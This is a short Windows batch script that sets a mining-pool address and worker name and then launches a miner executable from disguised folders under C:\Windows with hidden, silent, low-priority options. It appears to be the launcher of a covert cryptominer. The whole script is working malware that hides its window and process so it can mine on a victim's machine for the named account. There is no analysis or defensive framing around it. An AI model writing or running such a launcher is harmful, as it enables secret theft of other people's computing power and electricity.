@echo off

set minuser=oliverafa.2
set minurl=stratum+tcp://us.multipool.us:3373

start C:\Windows\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\Windows\mskfea\mskafeb\" /BELOWNORMAL ""C:\Windows\mskfea\mskafeb\mskafeb.exe" -D -a x11 -o %minurl% -u %minuser% -p x"
